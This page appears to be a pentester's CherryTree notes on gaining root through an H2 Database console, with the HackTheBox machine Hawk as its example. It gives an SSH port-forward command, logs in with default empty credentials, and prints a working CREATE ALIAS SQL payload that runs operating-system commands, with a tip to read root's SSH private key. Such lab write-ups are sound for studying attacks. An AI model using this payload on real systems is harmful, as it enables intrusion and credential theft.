<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>H2 Database</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># H2 Database</h1></strong><br /><br /><strong>Examples</strong><br />• hackthebox Hawk<br /><br /><strong><h2>## H2 Running as Root</h2></strong><br />If H2 is running as <code>root</code>, you can use it to priv-esc to <code>root</code>.<br /><div class="codebox"><div class="codebox">daniel@hawk:~$&nbsp;ps&nbsp;aux&nbsp;|&nbsp;grep&nbsp;root<br />[...]<br />root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;833&nbsp;&nbsp;0.0&nbsp;&nbsp;0.0&nbsp;&nbsp;&nbsp;4628&nbsp;&nbsp;&nbsp;860&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ss&nbsp;&nbsp;&nbsp;16:00&nbsp;&nbsp;&nbsp;0:00&nbsp;/bin/sh&nbsp;-c&nbsp;/usr/bin/java&nbsp;-jar&nbsp;/opt/h2/bin/h2-1.4.196.jar<br />root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;834&nbsp;&nbsp;0.7&nbsp;&nbsp;5.2&nbsp;2329256&nbsp;52072&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sl&nbsp;&nbsp;&nbsp;16:00&nbsp;&nbsp;&nbsp;0:02&nbsp;/usr/bin/java&nbsp;-jar&nbsp;/opt/h2/bin/h2-1.4.196.jar<br />[...]</div></div><br /><br />1. Port forward the H2 Database console out to your attacking machine<br /><code>ssh -R 8082:127.0.0.1:8082 bob@10.10.14.7 -N</code><br />2. Browse to the H2 database console at <code>http://127.0.0.1:8082</code><br />3. You most likely can&#39;t log in (because the database URL is pointing somewhere you can&#39;t access<br />    Change the database URL to a folder that we have write access to<br />   <a href=""><img src="images/308-1.png" alt="images/308-1.png" /></a><br />4. Log in with no credentials (no credentials is default credentials)<br /><br /><strong><h3>### Execute Code</h3></strong><strong><br />• </strong><a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html</a><br />• Standard reverse shells don&#39;t normally work (but still try them)<br />   ◇ Instead, try reading root&#39;s .ssh private key or something<br /><br /><code>CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;;  }$$;</code><br /><br />You can then execute code by calling your SHELLEXEC alias and a command.<br /><code>CALL SHELLEXEC(&#39;id&#39;)</code><strong><br /></strong><br /><a href=""><img src="images/308-2.png" alt="images/308-2.png" /></a></div>
</body>
</html>
